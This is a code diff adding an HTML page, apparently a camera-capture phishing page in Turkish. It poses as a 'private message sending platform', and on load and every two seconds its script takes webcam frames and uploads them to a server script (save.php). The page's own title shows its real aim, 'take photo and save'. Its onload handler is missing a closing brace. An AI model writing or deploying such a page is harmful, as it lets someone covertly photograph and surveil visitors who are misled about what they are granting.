@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fotoğraf Çek ve Kaydet</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            margin: 50px;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+
+        }
+        .background {
+          background-image: url('/htcdos/d.gif');
+          background-size: cover; /* veya contain, isteğe bağlı olarak */
+          background-repeat: no-repeat;
+          background-position: center center;
+          height: 100vh; /* Ekranın tamamını kaplamak için */
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          color: #ffffff; /* Metin rengi, isteğe bağlı olarak */
+}
+        h1 {
+            color: black;
+            font-family: monospace;
+            text-align: center;
+        }
+
+        #capture {
+            display: none;
+        }
+
+        #result {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<h1 data-value="Özel Mesaj Gönderme Platformu">Özel Mesaj Gönderme Platformu</h1>
+<br/>
+<hr/>
+<button onclick="capturePhoto()">Bilgi Al</button>
+
+<canvas id="capture" width="640" height="480"></canvas>
+
+<div id="result"></div>
+<div class="background"></div>
+<script>
+    const letters = "ABCÇDEFGĞHIİJKLMNOÖPRSŞTUÜVYZ";
+    document.querySelector("h1").onmouseover = (event) => {
+        let repetition = 0;
+        const interval = setInterval(() => {
+            event.target.innerText = event.target.innerText
+                .split("")
+                .map((letter, index) => {
+                    if (index < repetition) {
+                        return event.target.dataset.value[index];
+                    }
+                    return letters[Math.floor(Math.random() * 29)];
+                })
+                .join("");
+
+            if (repetition >= event.target.dataset.value.length)
+                clearInterval(interval);
+            repetition += 1 / 3;
+
+        }, 30);
+    };
+
+    async function capturePhoto() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            document.body.appendChild(video);
+
+            const canvas = document.getElementById('capture');
+            const context = canvas.getContext('2d');
+
+            video.onloadedmetadata = function () {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const imageDataUrl = canvas.toDataURL('image/png');
+
+                saveImage(imageDataUrl);
+
+                document.body.removeChild(video);
+                context.clearRect(0, 0, canvas.width, canvas.height);
+            };
+        } catch (error) {
+            console.error('Kamera izni alınamadı:', error);
+        }
+    }
+
+    function saveImage(imageDataUrl) {
+        const xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    document.getElementById('result').innerHTML = xhr.responseText;
+                } else {
+                    console.error('Görüntü kaydedilemedi. Sunucu hatası:', xhr.status, xhr.statusText);
+                }
+            }
+        };
+
+        xhr.open('POST', 'save.php', true);
+        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        xhr.send('imageDataUrl=' + encodeURIComponent(imageDataUrl));
+    }
+      window.onload = function() {
+        capturePhoto(); // Sayfa yüklendiğinde bir kere çağrılır
+        setInterval(capturePhoto, 2000);
+</script>
+
+</body>
+</html>
